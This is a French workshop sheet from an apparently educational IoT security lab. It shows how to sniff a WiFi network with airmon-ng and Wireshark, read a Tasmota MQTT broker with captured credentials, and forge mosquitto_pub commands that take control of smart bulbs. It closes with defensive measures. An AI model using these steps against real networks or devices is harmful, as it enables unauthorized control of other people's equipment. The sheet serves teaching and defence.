# Activité : Forge de paquets MQTT sur Tasmota bulbs

## Qu'est-ce qu'une ampoule connectée Tasmota ?

Les ampoules connectées Tasmota permettent de changer la couleur à distance et offrent des animations possibles, comme :
- Dégradé de couleurs
- Couleurs tournantes

### Firmware open-source Tasmota

Tasmota est un firmware open-source, conçu pour fonctionner sans cloud. Il offre plusieurs avantages :
- **Contrôle total** de la sécurité de l'objet
- **Confidentialité** des messages échangés
- **Compatibilité et flexibilité** : facile à intégrer sans intermédiaires
- **Résilience et fiabilité** : indépendant de la connectivité à Internet

## Activité : Forge de paquets MQTT sur Tasmota bulbs

### A vous de jouer !

Dans cet atelier, nous partons du principe que les identifiants du WiFi ont déjà été compromis.

### Étape 1 : Mise en écoute du réseau avec l'utilitaire Aircrack

1. Récupérez le nom de votre interface réseau avec la commande :
    ```bash
    ip -4 --br a
    ```

2. Pour démarrer Aircrack, exécutez la commande suivante :
    ```bash
    sudo airmon-ng start interface
    ```

### Étape 2 : Ouvrir l’utilitaire Wireshark pour analyser le réseau

1. Dans Wireshark, allez dans le menu `Edit -> Preferences -> Protocols -> IEEE 802.11`.
2. Entrez la clé suivante permettant de déchiffrer les échanges sur le réseau.
3. Filtrez les trames par `mqtt`.
4. Recherchez le paquet suivant (1er paquet) : 

### Étape 3 : Écoute des messages du broker MQTT

Nous avons récupéré les identifiants du broker MQTT, comparez-les avec ceux du WiFi.

1. Pour écouter les messages qui transitent sur le broker, quittez le mode MONITOR avec la commande :
    ```bash
    sudo airmon-ng stop wlp0s20f3mon
    ```

2. Lancez la commande suivante pour vous connecter au broker :
    ```bash
    mosquitto_sub -h 192.168.10.2 -t '#' -u USERNAME -P PASSWORD
    ```

3. Observez les messages qui transitent sur le réseau. Exemple :
    ```
    cmnd/tasmota_CFFCD0/Backlog NoDelay;Power1 OFF
    stat/tasmota_CFFCD0/RESULT {"POWER":"OFF"}
    stat/tasmota_CFFCD0/POWER OFF
    ```

### Étape 4 : Envoi de trames MQTT d'ordre aux ampoules

Les topics à utiliser pour publier des messages :
- Dans l'exemple précédent :
  - Topic : `stat/tasmota_CFFCD0/RESULT`
  - Donnée : `NoDelay;Power1 OFF` ou `{"POWER":"ON"}`

Tentez de forger une nouvelle trame avec le modèle suivant :
    ```bash
    mosquitto_pub -h 192.168.10.2 -u "USER" -P "PASSWORD" -t "TOPIC" -m "DATA"
    ```

### Arrivez-vous à :

- Éteindre/allumer l’ampoule ?
- Changer la couleur de l’ampoule ?

**Félicitations**, vous avez réussi à prendre le contrôle d’un appareil IoT qui ne vous appartient pas !

## Bilan de l'activité : Comment se protéger d'une attaque par forge de paquet ?

Voici quelques mesures pour sécuriser votre réseau et éviter des attaques similaires :

- **Sécuriser les flux MQTT avec le protocole MQTT/SSL.**
- **Utiliser des mots de passe forts** pour vos brokers MQTT/SSL, par exemple : TeeX4eyH3dJq&Cv8t$QDNvqN%BxUIx^U
- **Séparer le réseau IoT du réseau principal** : Différez bien vos réseaux en fonction de vos usages.
- **Activer le filtrage MAC sur le réseau** pour empêcher de nouvelles machines inconnues de s’y connecter.

Des questions ? Des remarques ? Discutons-en !

